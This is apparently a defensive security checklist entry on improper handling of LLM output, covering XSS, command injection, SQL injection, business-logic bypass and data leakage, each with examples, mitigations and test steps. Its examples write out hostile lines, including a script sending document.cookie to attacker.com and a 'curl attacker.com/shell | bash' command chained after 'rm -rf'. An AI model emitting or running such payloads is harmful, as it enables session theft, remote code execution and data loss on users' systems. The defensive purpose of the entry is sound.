name: Improper Output Handling
what_it_means: LLM-generated output is passed to downstream components (browsers, databases, shells, APIs) without sanitization, enabling XSS, SQL injection, code execution, or SSRF via AI-generated content.
animated_example: Like a secretary reading an instruction letter aloud on the intercom without checking if it secretly tells maintenance to unlock the vault.
quick_checks: Is LLM output sanitized (HTML-escaped, parameterized) before rendering in a browser or inserting into a database?
Is LLM-generated code executed in a sandbox with no network or filesystem access?
Are structured outputs validated against a strict schema before use in downstream systems?
Are LLM-generated URLs or commands blocked from direct execution without human review?
Is business logic protected from LLM-generated inputs that exploit workflow assumptions?

payload_types.description: LLM generates HTML, JavaScript, or markdown containing executable scripts or event handlers that are rendered unsanitized in a browser, enabling Cross-Site Scripting attacks.
examples: LLM responds with <script>fetch('https://attacker.com/?c='+document.cookie)</script> that is rendered directly in the UI
Markdown-rendered LLM response with embedded onclick event handlers: [click me](javascript:alert(1))
LLM generates a form with action pointing to a malicious data-collection endpoint
LLM response includes payload that executes on render
LLM-generated SVG with embedded JavaScript that executes when the SVG is rendered in-browser
mitigation: HTML-encode all LLM output before rendering in any browser context — never render raw LLM text as HTML.
Apply a strict Content-Security-Policy (CSP) header to block inline script execution, even if XSS payloads reach the browser.
Use a sanitization library (e.g., DOMPurify) to strip dangerous HTML elements and event handlers from LLM output before DOM insertion.
Render LLM output as plain text by default; only use HTML rendering where explicitly needed and with full sanitization applied.
Test LLM-rendered UI surfaces with an XSS probe suite covering all common payload vectors as part of automated security testing.

payload_types.description: LLM-generated shell commands, system calls, or action strings are executed directly without validation, enabling arbitrary command execution on the host system.
examples: LLM suggests: rm -rf /tmp/user_files && curl attacker.com/shell | bash — executed by an automated code runner
Code interpreter executes LLM-written Python with os.system() or subprocess calls that spawn external processes
LLM-generated configuration file with embedded shell command hooks executed on load by an automation tool
Agentic LLM generates a terminal command string that is passed directly to exec() without validation
LLM output used to populate a system() call in a CLI tool, allowing command separator injection via semicolons or pipes
mitigation: Never pass LLM-generated strings directly to shell execution functions (exec, system, popen, subprocess) — always validate against an allowlist of permitted commands.
Execute all LLM-generated code in isolated sandboxes (containers, VMs, WebAssembly runtimes) with no network access, no filesystem write access, and strict resource limits.
Require explicit human confirmation before executing any LLM-generated command that modifies system state.
Use structured command interfaces rather than free-form shell execution — define a strict vocabulary of permitted actions the LLM can invoke.
Log every command execution attempt triggered by LLM output with the full originating prompt and validate against an approved action schema.

payload_types.type: SQL / Query Injection via LLM Output
payload_types.description: LLM-generated SQL queries, filter strings, or query parameters are inserted directly into database calls without parameterization, enabling SQL injection.
examples: LLM constructs: SELECT * FROM users WHERE name='$input' — attacker input becomes: ' OR '1'='1
LLM-generated ORM filter string inserted directly into a Django or SQLAlchemy query without escaping
Natural language query translated by LLM to raw SQL and executed against a production database
LLM generates a MongoDB query with $where clause populated from user input enabling JavaScript injection
LLM-produced LDAP filter string used in a directory lookup without sanitization, enabling LDAP injection
mitigation: Never concatenate LLM-generated output directly into SQL, NoSQL, or LDAP queries — always use parameterized queries or prepared statements.
Validate LLM-generated query fragments against a strict schema and allowlist before executing against any data store.
Apply least-privilege database accounts for LLM-integrated services — the database user should have read-only access unless write is explicitly required.
Use an ORM layer with parameterization as the only permitted database interface; block raw query construction pathways.
Test all LLM-to-database data flows with SQL injection probe suites as part of pre-deployment security testing.

payload_types.description: LLM-generated output exploits assumptions in application business logic, bypassing workflow controls, authorization checks, or rate limits through manipulation of structured outputs.
examples: LLM generates a JSON payload with a manipulated role field ('admin') that is trusted by the downstream API without re-validation
LLM output includes a price field set to 0.01 for an item that the checkout service accepts without server-side price validation
LLM-generated API call sequence exploits a multi-step workflow by skipping required intermediate state transitions
LLM produces a discount code or voucher value that bypasses business rules in the e-commerce layer
LLM generates a date/time field in a booking system that bypasses availability checks due to timezone handling assumptions
mitigation: Never trust LLM-generated values for security-sensitive fields (user roles, prices, permissions, IDs) — re-validate all such fields server-side against authoritative data sources.
Validate LLM-generated structured outputs (JSON, XML) against strict schemas with explicit allowable value ranges before processing.
Apply business rule enforcement at the application layer, not the LLM layer — treat LLM output as untrusted user input.
Test all LLM integration points with boundary-value and logic bypass test cases as part of security review.
Implement server-side workflow state machines that enforce valid state transitions regardless of LLM-generated instruction content.

payload_types.description: LLM-generated responses inadvertently include sensitive data from context, retrieved documents, or memory that should not be returned to the requesting user.
examples: LLM summarization task returns a document that includes PII from an adjacent retrieved record the user should not see
LLM output includes a full database row with sensitive fields (SSN, payment card) that were present in the retrieved context
LLM code generation response includes hardcoded credentials that were present in example code in its context
LLM generates a report that summarizes confidential sections of a document beyond the user's authorization scope
LLM response includes session tokens or API keys that were accidentally included in the system context or prior conversation
mitigation: Apply a DLP (Data Loss Prevention) output filter scanning all LLM responses for PII patterns, credential formats, and classified keywords before returning to the user.
Scope RAG retrieval strictly to documents the authenticated user is authorized to access — enforce access control at the retrieval layer, not only at the document storage layer.
Sanitize all context injected into the LLM prompt — remove sensitive fields, tokens, and credentials before they enter the model's context window.
Implement output classification to detect responses that contain confidential data categories and route them for review before delivery.
Log all LLM responses containing detected sensitive content patterns and alert on anomalous disclosure rates.

how_to_test: Step 1: Prompt the LLM to generate XSS payloads and check if they are rendered or escaped in the UI
Step 2: Test whether LLM-generated SQL fragments are concatenated into live queries
Step 3: Verify code interpreter sandbox: attempt file system access, network calls, or process spawning from LLM-generated code
Step 4: Submit prompts that lead the LLM to generate internal IP URLs and verify these are blocked before fetching
Step 5: Check if LLM output passes through output encoding before insertion into HTML, JSON, or SQL contexts
Step 6: Test business logic bypass: supply manipulated role, price, or permission values via LLM output and verify server-side re-validation
expected_outcomes: All LLM output is encoded/escaped before rendering in any downstream context
LLM-generated code executes in a sandboxed environment with no escape paths
No XSS, SQLi, command injection, or business logic bypass reachable through LLM-generated content
DLP filter catches and redacts sensitive data in LLM responses before delivery to users
minimal_example: LLM response contains <script>document.cookie</script> → output encoder converts to <script>... → browser renders as text, not executable code
mitigation: Apply context-aware output encoding to all LLM-generated content before rendering — HTML-encode for browser contexts, parameterize for database contexts, and shell-escape for command execution contexts; never pass raw LLM output directly to downstream execution

Execute all LLM-generated code in isolated sandbox environments (containers, VMs) with no network access, no filesystem write access, and strict resource limits — require explicit human review before executing AI-generated commands in production

Validate all LLM-structured outputs (JSON, SQL, XML) against strict schemas and re-validate security-sensitive fields (roles, prices, permissions) server-side before processing — treat LLM output as untrusted user input at all application boundaries

Deploy a DLP output filter scanning all LLM responses for PII patterns, credential formats, and sensitive keywords before delivery; enforce strict RAG access control to prevent cross-user data leakage via LLM summarization
